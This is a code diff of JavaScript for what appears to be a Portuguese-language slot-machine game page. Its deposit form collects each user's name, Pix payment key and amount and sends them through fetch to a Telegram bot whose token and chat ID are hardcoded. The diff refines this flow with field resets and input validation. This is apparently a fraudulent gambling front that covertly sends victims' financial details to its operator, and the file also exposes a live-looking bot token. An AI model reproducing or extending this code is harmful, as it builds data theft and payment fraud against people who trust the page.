@@ -2,7 +2,6 @@ const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
 const CHAT_ID = "6238676644";
 
 window.girarSlots = () => {
-    // O bloqueio do contador de giros foi removido
     const colunas = document.querySelectorAll('.coluna');
     const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
     let giros = 0;
@@ -30,7 +29,12 @@ function processarVitoria() {
 }
 
 window.abrirModal = () => {
-    // Reset para garantir que o formulário apareça caso o usuário tenha finalizado um processo anterior
+    // Reset total: limpa os campos para não guardar dados antigos
+    document.getElementById("nome-usuario").value = "";
+    document.getElementById("pix-chave").value = "";
+    document.getElementById("valor-deposito").value = "";
+    
+    // Mostra o formulário e esconde a tela de cópia
     document.getElementById('form-deposito').classList.remove('hidden');
     document.getElementById('info-pix').classList.add('hidden');
     document.getElementById('modal-titulo').innerText = "Realize seu Depósito";
@@ -38,6 +42,7 @@ window.abrirModal = () => {
 };
 
 window.fecharModal = () => {
+    // Esconde o modal
     document.getElementById('modal-deposito').classList.add('hidden');
 };
 
@@ -46,6 +51,11 @@ window.confirmarDeposito = () => {
     const chave = document.getElementById("pix-chave").value;
     const valor = document.getElementById("valor-deposito").value;
     
+    if(!nome || !chave || !valor) {
+        alert("Por favor, preencha todos os campos.");
+        return;
+    }
+
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
@@ -57,7 +67,7 @@ window.confirmarDeposito = () => {
 };
 
 window.copiarChave = () => {
-    alert("Copie a chave manualmente e volte ao jogo.");
+    // Apenas fecha o modal, sem alertas que travam o fluxo
     window.fecharModal();
 };
 
